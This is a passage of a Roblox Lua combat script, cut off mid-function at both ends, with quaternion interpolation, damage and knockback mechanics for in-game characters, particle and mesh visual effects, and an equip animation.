mesh.MeshType=meshtype
if meshid~="nil" then
mesh.MeshId="http://www.roblox.com/asset/?id="..meshid
end
end
mesh.Offset=offset
mesh.Scale=scale
return mesh
end
 
function weld(parent,part0,part1,c0)
local weld=it("Weld") 
weld.Parent=parent
weld.Part0=part0 
weld.Part1=part1 
weld.C0=c0
return weld
end
 
local Color1=Torso.BrickColor

local bodvel=Instance.new("BodyVelocity")
local bg=Instance.new("BodyGyro")

function swait(num)
if num==0 or num==nil then
game:service'RunService'.Stepped:wait(0)
else
for i=0,num do
game:service'RunService'.Stepped:wait(0)
end
end
end
 
 
so = function(id,par,vol,pit) 
coroutine.resume(coroutine.create(function()
local sou = Instance.new("Sound",char)
sou.Volume = 0
if not NoSound then
	sou.Volume=vol
end
sou.Pitch=pit or 1
sou.SoundId=id
swait() 
sou:play() 
game:GetService("Debris"):AddItem(sou,6)
end))
end
 
function clerp(a,b,t) 
local qa = {QuaternionFromCFrame(a)}
local qb = {QuaternionFromCFrame(b)} 
local ax, ay, az = a.x, a.y, a.z 
local bx, by, bz = b.x, b.y, b.z
local _t = 1-t
return QuaternionToCFrame(_t*ax + t*bx, _t*ay + t*by, _t*az + t*bz,QuaternionSlerp(qa, qb, t)) 
end 
 
function QuaternionFromCFrame(cf) 
local mx, my, mz, m00, m01, m02, m10, m11, m12, m20, m21, m22 = cf:components() 
local trace = m00 + m11 + m22 
if trace > 0 then 
local s = math.sqrt(1 + trace) 
local recip = 0.5/s 
return (m21-m12)*recip, (m02-m20)*recip, (m10-m01)*recip, s*0.5 
else 
local i = 0 
if m11 > m00 then
i = 1
end
if m22 > (i == 0 and m00 or m11) then 
i = 2 
end 
if i == 0 then 
local s = math.sqrt(m00-m11-m22+1) 
local recip = 0.5/s 
return 0.5*s, (m10+m01)*recip, (m20+m02)*recip, (m21-m12)*recip 
elseif i == 1 then 
local s = math.sqrt(m11-m22-m00+1) 
local recip = 0.5/s 
return (m01+m10)*recip, 0.5*s, (m21+m12)*recip, (m02-m20)*recip 
elseif i == 2 then 
local s = math.sqrt(m22-m00-m11+1) 
local recip = 0.5/s return (m02+m20)*recip, (m12+m21)*recip, 0.5*s, (m10-m01)*recip 
end 
end 
end
 
function QuaternionToCFrame(px, py, pz, x, y, z, w) 
local xs, ys, zs = x + x, y + y, z + z 
local wx, wy, wz = w*xs, w*ys, w*zs 
local xx = x*xs 
local xy = x*ys 
local xz = x*zs 
local yy = y*ys 
local yz = y*zs 
local zz = z*zs 
return CFrame.new(px, py, pz,1-(yy+zz), xy - wz, xz + wy,xy + wz, 1-(xx+zz), yz - wx, xz - wy, yz + wx, 1-(xx+yy)) 
end
 
function QuaternionSlerp(a, b, t) 
local cosTheta = a[1]*b[1] + a[2]*b[2] + a[3]*b[3] + a[4]*b[4] 
local startInterp, finishInterp; 
if cosTheta >= 0.0001 then 
if (1 - cosTheta) > 0.0001 then 
local theta = math.acos(cosTheta) 
local invSinTheta = 1/math.sin(theta) 
startInterp = math.sin((1-t)*theta)*invSinTheta 
finishInterp = math.sin(t*theta)*invSinTheta  
else 
startInterp = 1-t 
finishInterp = t 
end 
else 
if (1+cosTheta) > 0.0001 then 
local theta = math.acos(-cosTheta) 
local invSinTheta = 1/math.sin(theta) 
startInterp = math.sin((t-1)*theta)*invSinTheta 
finishInterp = math.sin(t*theta)*invSinTheta 
else 
startInterp = t-1 
finishInterp = t 
end 
end 
return a[1]*startInterp + b[1]*finishInterp, a[2]*startInterp + b[2]*finishInterp, a[3]*startInterp + b[3]*finishInterp, a[4]*startInterp + b[4]*finishInterp 
end

local function CFrameFromTopBack(at, top, back)
local right = top:Cross(back)
return CFrame.new(at.x, at.y, at.z,
right.x, top.x, back.x,
right.y, top.y, back.y,
right.z, top.z, back.z)
end

function Triangle(a, b, c)
local edg1 = (c-a):Dot((b-a).unit)
local edg2 = (a-b):Dot((c-b).unit)
local edg3 = (b-c):Dot((a-c).unit)
if edg1 <= (b-a).magnitude and edg1 >= 0 then
a, b, c = a, b, c
elseif edg2 <= (c-b).magnitude and edg2 >= 0 then
a, b, c = b, c, a
elseif edg3 <= (a-c).magnitude and edg3 >= 0 then
a, b, c = c, a, b
else
assert(false, "unreachable")
end
 
local len1 = (c-a):Dot((b-a).unit)
local len2 = (b-a).magnitude - len1
local width = (a + (b-a).unit*len1 - c).magnitude
 
local maincf = CFrameFromTopBack(a, (b-a):Cross(c-b).unit, -(b-a).unit)
 
local list = {}
 
if len1 > 0.01 then
local w1 = Instance.new('WedgePart', m)
game:GetService("Debris"):AddItem(w1,5)
w1.Material = "SmoothPlastic"
w1.FormFactor = 'Custom'
w1.BrickColor = BrickColor.new("Really red")
w1.Transparency = 0
w1.Reflectance = 0
w1.Material = "SmoothPlastic"
w1.CanCollide = false
local l1 = Instance.new("PointLight",w1)
l1.Color = Color3.new(170,0,0)
NoOutline(w1)
local sz = Vector3.new(0.2, width, len1)
w1.Size = sz
local sp = Instance.new("SpecialMesh",w1)
sp.MeshType = "Wedge"
sp.Scale = Vector3.new(0,1,1) * sz/w1.Size
w1:BreakJoints()
w1.Anchored = true
w1.Parent = workspace
w1.Transparency = 0.7
table.insert(Effects,{w1,"Disappear",.01})
w1.CFrame = maincf*CFrame.Angles(math.pi,0,math.pi/2)*CFrame.new(0,width/2,len1/2)
table.insert(list,w1)
end
 
if len2 > 0.01 then
local w2 = Instance.new('WedgePart', m)
game:GetService("Debris"):AddItem(w2,5)
w2.Material = "SmoothPlastic"
w2.FormFactor = 'Custom'
w2.BrickColor = BrickColor.new("Really red")
w2.Transparency = 0
w2.Reflectance = 0
w2.Material = "SmoothPlastic"
w2.CanCollide = false
local l2 = Instance.new("PointLight",w2)
l2.Color = Color3.new(170,0,0)
NoOutline(w2)
local sz = Vector3.new(0.2, width, len2)
w2.Size = sz
local sp = Instance.new("SpecialMesh",w2)
sp.MeshType = "Wedge"
sp.Scale = Vector3.new(0,1,1) * sz/w2.Size
w2:BreakJoints()
w2.Anchored = true
w2.Parent = workspace
w2.Transparency = 0.7
table.insert(Effects,{w2,"Disappear",.01})
w2.CFrame = maincf*CFrame.Angles(math.pi,math.pi,-math.pi/2)*CFrame.new(0,width/2,-len1 - len2/2)
table.insert(list,w2)
end
return unpack(list)
end
 

function Damagefunc(Part, hit, minim, maxim, knockback, Type, Property, Delay, HitSound, HitPitch)
  if hit.Parent == nil then
    return
  end
  local h = hit.Parent:FindFirstChildOfClass("Humanoid")
  for _, v in pairs(hit.Parent:children()) do
    if v:IsA("Humanoid") then
      h = v
    end
  end
  if h ~= nil and hit.Parent.Name ~= Character.Name and hit.Parent:FindFirstChild("Torso") ~= nil or h ~= nil and hit.Parent.Name ~= Character.Name and hit.Parent:FindFirstChild("UpperTorso") ~= nil then
    if hit.Parent:findFirstChild("DebounceHit") ~= nil and hit.Parent.DebounceHit.Value == true then
      return
    end
    local c = Create("ObjectValue")({
      Name = "creator",
      Value = game:service("Players").LocalPlayer,
      Parent = h
    })
    game:GetService("Debris"):AddItem(c, 0.5)
    if HitSound ~= nil and HitPitch ~= nil then
      CFuncs.Sound.Create(HitSound, hit, 1, HitPitch)
    end
    local Damage = math.random(minim, maxim)
    local blocked = false
    local block = hit.Parent:findFirstChild("Block")
    if block ~= nil and block.className == "IntValue" and block.Value > 0 then
      blocked = true
      block.Value = block.Value - 1
      print(block.Value)
    end
    if blocked == false then
	DamageFling(hit.Parent)
      if HitHealth ~= h.Health and HitHealth ~= 0 and 0 >= h.Health and h.Parent.Name ~= "Hologram" then
        print("gained kill")
      end
      ShowDamage(Part.CFrame * CFrame.new(0, 0, Part.Size.Z / 2).p + Vector3.new(0, 1.5, 0), -Damage, 1.5, Part.BrickColor.Color)
    else
	DamageFling(hit.Parent)
      ShowDamage(Part.CFrame * CFrame.new(0, 0, Part.Size.Z / 2).p + Vector3.new(0, 1.5, 0), -Damage, 1.5, Part.BrickColor.Color)
    end
    if Type == "Knockdown" then
      local hum = hit.Parent.Humanoid
      hum.PlatformStand = true
      coroutine.resume(coroutine.create(function(HHumanoid)
        swait(1)
        HHumanoid.PlatformStand = false
      end), hum)
      local angle = hit.Position - (Property.Position + Vector3.new(0, 0, 0)).unit
      local bodvol = Create("BodyVelocity")({
        velocity = angle * knockback,
        P = 5000,
        maxForce = Vector3.new(8000, 8000, 8000),
        Parent = hit
      })
      local rl = Create("BodyAngularVelocity")({
        P = 3000,
        maxTorque = Vector3.new(500000, 500000, 500000) * 50000000000000,
        angularvelocity = Vector3.new(math.random(-10, 10), math.random(-10, 10), math.random(-10, 10)),
        Parent = hit
      })
      game:GetService("Debris"):AddItem(bodvol, 0.5)
      game:GetService("Debris"):AddItem(rl, 0.5)
    elseif Type == "Normal" then
      local vp = Create("BodyVelocity")({
        P = 500,
        maxForce = Vector3.new(math.huge, 0, math.huge),
        velocity = Property.CFrame.lookVector * knockback + Property.Velocity / 1.05
      })
      if knockback > 0 then
        vp.Parent = hit.Parent.Torso
      end
      game:GetService("Debris"):AddItem(vp, 0.5)
    elseif Type == "Up" then
      local bodyVelocity = Create("BodyVelocity")({
        velocity = Vector3.new(0, 20, 0),
        P = 5000,
        maxForce = Vector3.new(8000, 8000, 8000),
        Parent = hit
      })
      game:GetService("Debris"):AddItem(bodyVelocity, 0.5)
      local bodyVelocity = Create("BodyVelocity")({
        velocity = Vector3.new(0, 20, 0),
        P = 5000,
        maxForce = Vector3.new(8000, 8000, 8000),
        Parent = hit
      })
      game:GetService("Debris"):AddItem(bodyVelocity, 1)
    elseif Type == "Leech" then
      local hum = hit.Parent.Humanoid
      if hum ~= nil then
        for i = 0, 2 do
          Effects.Sphere.Create(BrickColor.new("Bright red"), hit.Parent.Torso.CFrame * cn(0, 0, 0) * angles(math.random(-50, 50), math.random(-50, 50), math.random(-50, 50)), 1, 15, 1, 0, 5, 0, 0.02)
        end
      end
    elseif Type == "UpKnock" then
      local hum = hit.Parent.Humanoid
      hum.PlatformStand = true
      if hum ~= nil then
        hitr = true
      end
      coroutine.resume(coroutine.create(function(HHumanoid)
        swait(5)
        HHumanoid.PlatformStand = false
        hitr = false
      end), hum)
      local bodyVelocity = Create("BodyVelocity")({
        velocity = Vector3.new(0, 20, 0),
        P = 5000,
        maxForce = Vector3.new(8000, 8000, 8000),
        Parent = hit
      })
      game:GetService("Debris"):AddItem(bodyVelocity, 0.5)
      local bodyVelocity = Create("BodyVelocity")({
        velocity = Vector3.new(0, 20, 0),
        P = 5000,
        maxForce = Vector3.new(8000, 8000, 8000),
        Parent = hit
      })
      game:GetService("Debris"):AddItem(bodyVelocity, 1)
    elseif Type == "Snare" then
      local bp = Create("BodyPosition")({
        P = 2000,
        D = 100,
        maxForce = Vector3.new(math.huge, math.huge, math.huge),
        position = hit.Parent.Torso.Position,
        Parent = hit.Parent.Torso
      })
      game:GetService("Debris"):AddItem(bp, 1)
    elseif Type == "Slashnare" then
      Effects.Block.Create(BrickColor.new("Pastel Blue"), hit.Parent.Torso.CFrame * cn(0, 0, 0), 15*4, 15*4, 15*4, 3*4, 3*4, 3*4, 0.07)
      for i = 1, math.random(4, 5) do
        Effects.Sphere.Create(BrickColor.new("Teal"), hit.Parent.Torso.CFrame * cn(math.random(-5, 5), math.random(-5, 5), math.random(-5, 5)) * angles(math.random(-50, 50), math.random(-50, 50), math.random(-50, 50)), 1, 15, 1, 0, 5, 0, 0.02)
      end
      local bp = Create("BodyPosition")({
        P = 2000,
        D = 100,
        maxForce = Vector3.new(math.huge, math.huge, math.huge),
        position = hit.Parent.Torso.Position,
        Parent = hit.Parent.Torso
      })
      game:GetService("Debris"):AddItem(bp, 1)
    elseif Type == "Spike" then
      CreateBigIceSword(hit.Parent.Torso.CFrame)
      local bp = Create("BodyPosition")({
        P = 2000,
        D = 100,
        maxForce = Vector3.new(math.huge, math.huge, math.huge),
        position = hit.Parent.Torso.Position,
        Parent = hit.Parent.Torso
      })
      game:GetService("Debris"):AddItem(bp, 1)
    elseif Type == "Freeze" then
      local BodPos = Create("BodyPosition")({
        P = 50000,
        D = 1000,
        maxForce = Vector3.new(math.huge, math.huge, math.huge),
        position = hit.Parent.Torso.Position,
        Parent = hit.Parent.Torso
      })
      local BodGy = Create("BodyGyro")({
        maxTorque = Vector3.new(400000, 400000, 400000) * math.huge,
        P = 20000,
        Parent = hit.Parent.Torso,
        cframe = hit.Parent.Torso.CFrame
      })
      hit.Parent.Torso.Anchored = true
      coroutine.resume(coroutine.create(function(Part)
        swait(1.5)
        Part.Anchored = false
      end), hit.Parent.Torso)
      game:GetService("Debris"):AddItem(BodPos, 3)
      game:GetService("Debris"):AddItem(BodGy, 3)
    end
    local debounce = Create("BoolValue")({
      Name = "DebounceHit",
      Parent = hit.Parent,
      Value = true
    })
    game:GetService("Debris"):AddItem(debounce, Delay)
    c = Instance.new("ObjectValue")
    c.Name = "creator"
    c.Value = Player
    c.Parent = h
    game:GetService("Debris"):AddItem(c, 0.5)
  end
end
function ShowDamage(Pos, Text, Time, Color)
  local Rate = 0.1
  local Pos = Pos or Vector3.new(0, 0, 0)
  local Text = Text or ""
  local Time = Time or 2
  local Color = Color or Color3.new(1, 0, 1)
  local EffectPart = CreatePart(workspace, "SmoothPlastic", 0, 1, BrickColor.new(Color), "Effect", Vector3.new(0, 0, 0))
  EffectPart.Anchored = true
  local BillboardGui = Create("BillboardGui")({
    Size = UDim2.new(3, 0, 3, 0),
    Adornee = EffectPart,
    Parent = EffectPart
  })
  local TextLabel = Create("TextLabel")({
    BackgroundTransparency = 1,
    Size = UDim2.new(1, 0, 1, 0),
    Text = Text,
    TextColor3 = Color3.new(1,1,1),
    TextStrokeColor3 = Color3.new(0,0,0),
    TextStrokeTransparency = 0.25,
    TextScaled = true,
    Font = Enum.Font.Fantasy,
    TextSize = 24,
    Parent = BillboardGui
  })
  game.Debris:AddItem(EffectPart, Time + 0.1)
  EffectPart.Parent = game:GetService("Workspace")
  delay(0, function()
    local Frames = Time / Rate
    for Frame = 1, Frames do
      swait(Rate)
      local Percent = Frame / Frames
      TextLabel.Text = Text
      EffectPart.CFrame = CFrame.new(Pos) + Vector3.new(0, Percent*2, 0)
    end
    for Frame = 1, Frames do
      swait(Rate)
      local Percent = Frame / Frames
      TextLabel.Text = Text
    end
    for Frame = 1, Frames do
      swait(Rate)
      local Percent = Frame / Frames
      TextLabel.TextTransparency = Percent
      TextLabel.Text = Text
      TextLabel.TextStrokeTransparency = Percent
    end
    if EffectPart and EffectPart.Parent then
      EffectPart:Destroy()
    end
  end)
end
function MagniDamage(Part, magni, mindam, maxdam, knock, Type,Sound)
  for _, c in pairs(workspace:children()) do
    local hum = c:findFirstChildOfClass("Humanoid")
    if hum ~= nil then
      local head = c:findFirstChild("Torso")
      if head ~= nil then
        local targ = head.Position - Part.Position
        local mag = targ.magnitude
        if magni >= mag and c.Name ~= Player.Name then
          Damagefunc(head, head, mindam, maxdam, knock, Type, RootPart, 0.1, "rbxassetid://" ..Sound, 1)
        end
      end
      local head = c:findFirstChild("UpperTorso")
      if head ~= nil then
        local targ = head.Position - Part.Position
        local mag = targ.magnitude
        if magni >= mag and c.Name ~= Player.Name then
          Damagefunc(head, head, mindam, maxdam, knock, Type, RootPart, 0.1, "rbxassetid://" ..Sound, 1)
        end
      end
    end
  end
end


function rayCast(Pos, Dir, Max, Ignore)  -- Origin Position , Direction, MaxDistance , IgnoreDescendants
return game:service("Workspace"):FindPartOnRay(Ray.new(Pos, Dir.unit * (Max or 999.999)), Ignore) 
end 
----

function dmg(dude)
if dude.Name ~= Character then
local bgf = Instance.new("BodyGyro",dude.Head)
bgf.CFrame = bgf.CFrame * CFrame.fromEulerAnglesXYZ(math.rad(-90),0,0)
--[[local val = Instance.new("BoolValue",dude)
val.Name = "IsHit"]]--
local ds = coroutine.wrap(function()
for i, v in pairs(dude:GetChildren()) do
if v:IsA("Part") or v:IsA("MeshPart") then
v.Name = "DEMINISHED"
CFuncs["Sound"].Create("rbxassetid://763718160", v, 0.75, 1.1)
CFuncs["Sound"].Create("rbxassetid://782353443", v, 1, 1)
for i = 0, 1 do
sphere2(1,"Add",v.CFrame*CFrame.Angles(math.rad(math.random(-360,360)),math.rad(math.random(-360,360)),math.rad(math.random(-360,360))),vt(1,1,1),-0.01,10,-0.01,BrickColor.new("Royal purple"),BrickColor.new("Royal purple").Color)
end
end
end
wait(0.5)
targetted = nil
CFuncs["Sound"].Create("rbxassetid://62339698", char, 0.25, 0.285)
coroutine.resume(coroutine.create(function()
for i, v in pairs(dude:GetChildren()) do
if v:IsA("Accessory") then

end
if v:IsA("Humanoid") then

end
if v:IsA("CharacterMesh") then

end
if v:IsA("Model") then

end
if v:IsA("Part") or v:IsA("MeshPart") then
for x, o in pairs(v:GetChildren()) do
if o:IsA("Decal") then
end
end
coroutine.resume(coroutine.create(function()
v.Material = "Neon"
v.CanCollide = false
v.Anchored = false
local bld = Instance.new("ParticleEmitter",v)
bld.LightEmission = 1
bld.Texture = "rbxassetid://363275192" ---284205403
bld.Color = ColorSequence.new(BrickColor.new("Royal purple").Color)
bld.Rate = 500
bld.Lifetime = NumberRange.new(1)
bld.Size = NumberSequence.new({NumberSequenceKeypoint.new(0,2,0),NumberSequenceKeypoint.new(0.8,2.25,0),NumberSequenceKeypoint.new(1,0,0)})
bld.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0.5,0),NumberSequenceKeypoint.new(0.8,0.75,0),NumberSequenceKeypoint.new(1,1,0)})
bld.Speed = NumberRange.new(2,5)
bld.VelocitySpread = 50000
bld.Rotation = NumberRange.new(-500,500)
bld.RotSpeed = NumberRange.new(-500,500)
local sbs = Instance.new("BodyPosition", v)
sbs.P = 3000
sbs.D = 1000
sbs.maxForce = Vector3.new(50000000000, 50000000000, 50000000000)
sbs.position = v.Position + Vector3.new(math.random(-2,2),10 + math.random(-2,2),math.random(-2,2))
v.Color = BrickColor.new("Royal purple").Color
coroutine.resume(coroutine.create(function()
for i = 0, 49 do
swait(1)
end
for i = 0, 4 do
slash(math.random(10,50)/10,3,true,"Round","Add","Out",v.CFrame*CFrame.Angles(math.rad(math.random(-360,360)),math.rad(math.random(-360,360)),math.rad(math.random(-360,360))),vt(0.01,0.0025,0.01),math.random(10,100)/2500,BrickColor.new("White"))
end
block(1,"Add",v.CFrame,vt(0,0,0),0.1,0.1,0.1,BrickColor.new("Royal purple"),BrickColor.new("Royal purple").Color)
CFuncs["Sound"].Create("rbxassetid://782353117", v, 0.25, 1.2)
CFuncs["Sound"].Create("rbxassetid://1192402877", v, 0.5, 0.75)
bld.Speed = NumberRange.new(10,25)
bld.Drag = 5
bld.Acceleration = vt(0,2,0)
wait(0.5)
bld.Enabled = false
wait(4)
coroutine.resume(coroutine.create(function()
for i = 0, 99 do
swait()
end
end))
end))
end))
end
end
end))
end)
ds()
end
end

function sphere(bonuspeed,type,pos,scale,value,color)
local type = type
local rng = Instance.new("Part", char)
        rng.Anchored = true
        rng.BrickColor = color
        rng.CanCollide = false
        rng.FormFactor = 3
        rng.Name = "Ring"
        rng.Material = "Neon"
        rng.Size = Vector3.new(1, 1, 1)
        rng.Transparency = 0
        rng.TopSurface = 0
        rng.BottomSurface = 0
        rng.CFrame = pos
        local rngm = Instance.new("SpecialMesh", rng)
        rngm.MeshType = "Sphere"
rngm.Scale = scale
if rainbowmode == true then
rng.Color = Color3.new(r/255,g/255,b/255)
end
local scaler2 = 1
if type == "Add" then
scaler2 = 1*value
elseif type == "Divide" then
scaler2 = 1/value
end
coroutine.resume(coroutine.create(function()
for i = 0,10/bonuspeed,0.1 do
swait()
if rainbowmode == true then
rng.Color = Color3.new(r/255,g/255,b/255)
end
if type == "Add" then
scaler2 = scaler2 - 0.01*value/bonuspeed
elseif type == "Divide" then
scaler2 = scaler2 - 0.01/value*bonuspeed
end
if chaosmode == true then
rng.BrickColor = BrickColor.random()
end
rng.Transparency = rng.Transparency + 0.01*bonuspeed
rngm.Scale = rngm.Scale + Vector3.new(scaler2*bonuspeed, scaler2*bonuspeed, scaler2*bonuspeed)
end
rng:Destroy()
end))
end

function sphere2(bonuspeed,type,pos,scale,value,value2,value3,color,color3)
local type = type
local rng = Instance.new("Part", char)
        rng.Anchored = true
        rng.BrickColor = color
        rng.Color = color3
        rng.CanCollide = false
        rng.FormFactor = 3
        rng.Name = "Ring"
        rng.Material = "Neon"
        rng.Size = Vector3.new(1, 1, 1)
        rng.Transparency = 0
        rng.TopSurface = 0
        rng.BottomSurface = 0
        rng.CFrame = pos
        local rngm = Instance.new("SpecialMesh", rng)
        rngm.MeshType = "Sphere"
rngm.Scale = scale
local scaler2 = 1
local scaler2b = 1
local scaler2c = 1
if type == "Add" then
scaler2 = 1*value
scaler2b = 1*value2
scaler2c = 1*value3
elseif type == "Divide" then
scaler2 = 1/value
scaler2b = 1/value2
scaler2c = 1/value3
end
coroutine.resume(coroutine.create(function()
for i = 0,10/bonuspeed,0.1 do
swait()
if type == "Add" then
scaler2 = scaler2 - 0.01*value/bonuspeed
scaler2b = scaler2b - 0.01*value/bonuspeed
scaler2c = scaler2c - 0.01*value/bonuspeed
elseif type == "Divide" then
scaler2 = scaler2 - 0.01/value*bonuspeed
scaler2b = scaler2b - 0.01/value*bonuspeed
scaler2c = scaler2c - 0.01/value*bonuspeed
end
rng.Transparency = rng.Transparency + 0.01*bonuspeed
rngm.Scale = rngm.Scale + Vector3.new(scaler2*bonuspeed, scaler2b*bonuspeed, scaler2c*bonuspeed)
end
rng:Destroy()
end))
end

function block(bonuspeed,type,pos,scale,value,value2,value3,color,color3)
local type = type
local rng = Instance.new("Part", char)
        rng.Anchored = true
        rng.BrickColor = color
        rng.Color = color3
        rng.CanCollide = false
        rng.FormFactor = 3
        rng.Name = "Ring"
        rng.Material = "Neon"
        rng.Size = Vector3.new(1, 1, 1)
        rng.Transparency = 0
        rng.TopSurface = 0
        rng.BottomSurface = 0
        rng.CFrame = pos
        local rngm = Instance.new("SpecialMesh", rng)
        rngm.MeshType = "Brick"
rngm.Scale = scale
local scaler2 = 1
local scaler2b = 1
local scaler2c = 1
if type == "Add" then
scaler2 = 1*value
scaler2b = 1*value2
scaler2c = 1*value3
elseif type == "Divide" then
scaler2 = 1/value
scaler2b = 1/value2
scaler2c = 1/value3
end
coroutine.resume(coroutine.create(function()
for i = 0,10/bonuspeed,0.1 do
swait()
if type == "Add" then
scaler2 = scaler2 - 0.01*value/bonuspeed
scaler2b = scaler2b - 0.01*value/bonuspeed
scaler2c = scaler2c - 0.01*value/bonuspeed
elseif type == "Divide" then
scaler2 = scaler2 - 0.01/value*bonuspeed
scaler2b = scaler2b - 0.01/value*bonuspeed
scaler2c = scaler2c - 0.01/value*bonuspeed
end
rng.CFrame = rng.CFrame*CFrame.Angles(math.rad(math.random(-360,360)),math.rad(math.random(-360,360)),math.rad(math.random(-360,360)))
rng.Transparency = rng.Transparency + 0.01*bonuspeed
rngm.Scale = rngm.Scale + Vector3.new(scaler2*bonuspeed, scaler2b*bonuspeed, scaler2c*bonuspeed)
end
rng:Destroy()
end))
end

function sphereMK(bonuspeed,FastSpeed,type,pos,x1,y1,z1,value,color,color3,outerpos)
local type = type
local rng = Instance.new("Part", char)
        rng.Anchored = true
        rng.BrickColor = color
        rng.Color = color3
        rng.CanCollide = false
        rng.FormFactor = 3
        rng.Name = "Ring"
        rng.Material = "Neon"
        rng.Size = Vector3.new(1, 1, 1)
        rng.Transparency = 0
        rng.TopSurface = 0
        rng.BottomSurface = 0
        rng.CFrame = pos
rng.CFrame = rng.CFrame + rng.CFrame.lookVector*outerpos
        local rngm = Instance.new("SpecialMesh", rng)
        rngm.MeshType = "Sphere"
rngm.Scale = vt(x1,y1,z1)
if rainbowmode == true then
rng.Color = Color3.new(r/255,g/255,b/255)
end
local scaler2 = 1
local speeder = FastSpeed
if type == "Add" then
scaler2 = 1*value
elseif type == "Divide" then
scaler2 = 1/value
end
coroutine.resume(coroutine.create(function()
for i = 0,10/bonuspeed,0.1 do
swait()
if rainbowmode == true then
rng.Color = Color3.new(r/255,g/255,b/255)
end
if type == "Add" then
scaler2 = scaler2 - 0.01*value/bonuspeed
elseif type == "Divide" then
scaler2 = scaler2 - 0.01/value*bonuspeed
end
if chaosmode == true then
rng.BrickColor = BrickColor.random()
end
speeder = speeder - 0.01*FastSpeed*bonuspeed
rng.CFrame = rng.CFrame + rng.CFrame.lookVector*speeder*bonuspeed
rng.Transparency = rng.Transparency + 0.01*bonuspeed
rngm.Scale = rngm.Scale + Vector3.new(scaler2*bonuspeed, scaler2*bonuspeed, 0)
end
rng:Destroy()
end))
end

function waveEff(bonuspeed,type,typeoftrans,pos,scale,value,value2,color)
local type = type
local rng = Instance.new("Part", char)
        rng.Anchored = true
        rng.BrickColor = color
        rng.CanCollide = false
        rng.FormFactor = 3
        rng.Name = "Ring"
        rng.Material = "Neon"
        rng.Size = Vector3.new(1, 1, 1)
        rng.Transparency = 0
if typeoftrans == "In" then
rng.Transparency = 1
end
        rng.TopSurface = 0
        rng.BottomSurface = 0
        rng.CFrame = pos
        local rngm = Instance.new("SpecialMesh", rng)
        rngm.MeshType = "FileMesh"
rngm.MeshId = "rbxassetid://20329976"
rngm.Scale = scale
local scaler2 = 1
local scaler2b = 1
if type == "Add" then
scaler2 = 1*value
scaler2b = 1*value2
elseif type == "Divide" then
scaler2 = 1/value
scaler2b = 1/value2
end
local randomrot = math.random(1,2)
coroutine.resume(coroutine.create(function()
for i = 0,10/bonuspeed,0.1 do
swait()
if type == "Add" then
scaler2 = scaler2 - 0.01*value/bonuspeed
scaler2b = scaler2b - 0.01*value/bonuspeed
elseif type == "Divide" then
scaler2 = scaler2 - 0.01/value*bonuspeed
scaler2b = scaler2b - 0.01/value*bonuspeed
end
if randomrot == 1 then
rng.CFrame = rng.CFrame*CFrame.Angles(0,math.rad(5*bonuspeed/2),0)
elseif randomrot == 2 then
rng.CFrame = rng.CFrame*CFrame.Angles(0,math.rad(-5*bonuspeed/2),0)
end
if typeoftrans == "Out" then
rng.Transparency = rng.Transparency + 0.01*bonuspeed
elseif typeoftrans == "In" then
rng.Transparency = rng.Transparency - 0.01*bonuspeed
end
rngm.Scale = rngm.Scale + Vector3.new(scaler2*bonuspeed, scaler2b*bonuspeed, scaler2*bonuspeed)
end
rng:Destroy()
end))
end

function slash(bonuspeed,rotspeed,rotatingop,typeofshape,type,typeoftrans,pos,scale,value,color)
local type = type
local rotenable = rotatingop
local rng = Instance.new("Part", char)
        rng.Anchored = true
        rng.BrickColor = color
        rng.CanCollide = false
        rng.FormFactor = 3
        rng.Name = "Ring"
        rng.Material = "Neon"
        rng.Size = Vector3.new(1, 1, 1)
        rng.Transparency = 0
if typeoftrans == "In" then
rng.Transparency = 1
end
        rng.TopSurface = 0
        rng.BottomSurface = 0
        rng.CFrame = pos
        local rngm = Instance.new("SpecialMesh", rng)
        rngm.MeshType = "FileMesh"
if typeofshape == "Normal" then
rngm.MeshId = "rbxassetid://662586858"
elseif typeofshape == "Round" then
rngm.MeshId = "rbxassetid://662585058"
end
rngm.Scale = scale
local scaler2 = 1/10
if type == "Add" then
scaler2 = 1*value/10
elseif type == "Divide" then
scaler2 = 1/value/10
end
local randomrot = math.random(1,2)
coroutine.resume(coroutine.create(function()
for i = 0,10/bonuspeed,0.1 do
swait()
if type == "Add" then
scaler2 = scaler2 - 0.01*value/bonuspeed/10
elseif type == "Divide" then
scaler2 = scaler2 - 0.01/value*bonuspeed/10
end
if rotenable == true then
if randomrot == 1 then
rng.CFrame = rng.CFrame*CFrame.Angles(0,math.rad(rotspeed*bonuspeed/2),0)
elseif randomrot == 2 then
rng.CFrame = rng.CFrame*CFrame.Angles(0,math.rad(-rotspeed*bonuspeed/2),0)
end
end
if typeoftrans == "Out" then
rng.Transparency = rng.Transparency + 0.01*bonuspeed
elseif typeoftrans == "In" then
rng.Transparency = rng.Transparency - 0.01*bonuspeed
end
rngm.Scale = rngm.Scale + Vector3.new(scaler2*bonuspeed/10, 0, scaler2*bonuspeed/10)
end
rng:Destroy()
end))
end

rarmor.Attachment.Name = "Attachment2"
function FindNearestTorso(Position, Distance, SinglePlayer)
	if SinglePlayer then
		return (SinglePlayer.Torso.CFrame.p - Position).magnitude < Distance
	end
	local List = {}
	for i, v in pairs(workspace:GetChildren()) do
		if v:IsA("Model") then
			if v:findFirstChild("Torso") or v:findFirstChild("UpperTorso") then
				if v ~= Character then
					if (v.Head.Position - Position).magnitude <= Distance then
						table.insert(List, v)
					end 
				end 
			end 
		end 
	end
	return List
end


local dashing = false
local floatmode = false
local OWS = hum.WalkSpeed
local equipped = false
Instance.new("ForceField",char).Visible = false
Humanoid.Animator.Parent = nil
------------------
function equip()
	attack = true
	equipped = true
	hum.WalkSpeed = 0
tl1.Enabled = true
for i = 0, 9 do
slash(math.random(10,50)/10,3,true,"Round","Add","Out",root.CFrame*CFrame.new(0,-3,0)*CFrame.Angles(math.rad(math.random(-10,10)),math.rad(math.random(-360,360)),math.rad(math.random(-10,10))),vt(0.05,0.01,0.05),math.random(25,50)/250,BrickColor.new("White"))
end
CFuncs["Sound"].Create("rbxassetid://1368637781", rarmor, 2.5, 1.25)
CFuncs["Sound"].Create("rbxassetid://200633077", rarmor, 1, 1)
CFuncs["Sound"].Create("rbxassetid://169380495", rarmor, 0.5, 1.1)
sphere2(5,"Add",root.CFrame,vt(5,5,5),0.25,0.25,0.25,BrickColor.new("Cyan"),BrickColor.new("Cyan").Color)
sphere2(6,"Add",root.CFrame,vt(5,5,5),0.25,0.25,0.25,BrickColor.new("Royal purple"),BrickColor.new("Royal purple").Color)
	for i = 0, 2, 0.1 do
		swait()
hum.CameraOffset = vt(math.random(-5,5)/50,math.random(-5,5)/50,math.random(-5,5)/50)
